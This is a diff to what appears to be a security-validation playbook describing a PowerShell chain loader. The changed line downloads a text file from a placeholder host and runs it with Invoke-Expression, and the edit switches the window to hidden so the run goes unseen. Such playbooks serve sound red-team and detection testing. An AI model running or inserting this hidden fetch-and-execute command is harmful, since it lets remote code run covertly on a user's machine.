@@ -31,7 +31,7 @@ This method leveraged a PowerShell chain loader to install an application to the
 
 ### Execution
 
-powershell.exe -NoProfile -NoExit -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<your_url.com>/nexus-validation.txt' -UseBasicParsing).Content)"
+powershell.exe -NoProfile -WindowStyle hidden -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<your_url.com>/nexus-validation.txt' -UseBasicParsing).Content)"
 
 ### Validation
 
